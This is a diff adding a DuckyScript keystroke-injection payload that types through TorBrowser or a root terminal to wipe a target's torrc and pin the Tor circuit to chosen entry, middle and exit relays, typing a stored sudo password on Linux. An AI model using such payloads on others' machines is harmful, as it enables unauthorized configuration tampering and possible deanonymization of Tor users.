@@ -1,0 +1,128 @@
+REM_BLOCK
+################################################################
+#                                                              |
+# Title        : Set An Arbitrary And Persistent Tor Circuit   |
+# Author       : Aleff                                         |
+# Version      : 1.0                                           |
+# Category     : Execution                                     |
+# Target       : Windows 10/11; Linux;                         |
+#                                                              |
+################################################################
+
+Requirements:
+ - Tor installed
+ - Fingerprints of your relays
+
+Note:
+ - Payload tested using TorBrowser 13.0.8 based on Mozilla Firefoz 115.6.0esr ENG
+ - Payload tested on Windows 11_eng; Debian 12_eng; Ubuntu 23.10_eng;
+END_REM
+
+REM Set the Fingerprints here
+DEFINE #EntryNode example
+DEFINE #MiddleNode example
+DEFINE #ExitNode example
+
+REM_BLOCK
+Activation of administrator permissions may vary from system to system.
+For example, for Debian it is necessary to use 'su' while for other systems such as Ubuntu it is necessary to use 'sudo su'.
+In general this can vary and is information that could be crucial in case the target has tampered with this functionality.
+END_REM
+DEFINE #root_permission_command sudo su
+
+REM Edit this field only if you plan to use this script on Linux operating systems as you need administrator permissions and therefore you need to know the password.
+DEFINE #sudo_pass example
+
+REM Do not change the variables that begin with 'const', they are constants that allow the nodes to be configured correctly.
+DEFINE #const_entry_node EntryNodes
+DEFINE #const_middle_node MiddleNodes
+DEFINE #const_exit_node ExitNodes
+
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        Windows fully passive OS Detection and passive Detect Ready
+        Includes its own passive detect ready.
+        Does not require additional extensions.
+
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+            $_OS will be set to WINDOWS or NOT_WINDOWS
+            See end of payload for usage within payload
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+END_EXTENSION
+
+IF ($_OS == WINDOWS) THEN
+    REM Open the TorBrowser path
+    GUI
+    DELAY 500
+    STRINGLN tor browser
+    RIGHTARROW
+    DOWNARROW
+    DOWNARROW
+    ENTER
+    SHIFT F10
+    DELAY 500
+    DOWNARROW
+    DOWNARROW
+    ENTER
+    REM Search and open the torrc config file
+    CTRL f
+    DELAY 500
+    STRING torrc
+    DELAY 1500
+    DOWNARROW
+    SPACE
+    ENTER
+    TAB
+    ENTER
+    REM Delete all the previous data with the arbotrary nodes
+    CTRL a
+    DELETE
+    STRINGLN
+        #const_entry_node #EntryNode
+        #const_middle_node #MiddleNode
+        #const_exit_node #ExitNode
+    END_STRINGLN
+    CTRL s
+    ALT F4
+    ALT F4
+ELSE
+    REM Opens a new terminal and login with administrator permissions.
+    CTRL-ALT t
+    STRINGLN #root_permission_command
+    DELAY 500
+    STRING #sudo_pass
+    DELAY 1000
+    REM Writes the new configuration into the torrc file deleting all the previous settings.
+    STRINGLN
+        echo "#const_entry_node #EntryNode
+        #const_middle_node #MiddleNode
+        #const_exit_node #ExitNode" > /etc/tor/torrc
+    END_STRINGLN
+    REM Then exit from the super user and close the terminal
+    DELAY 500
+    STRINGLN exit
+    ALT F4
+END_IF
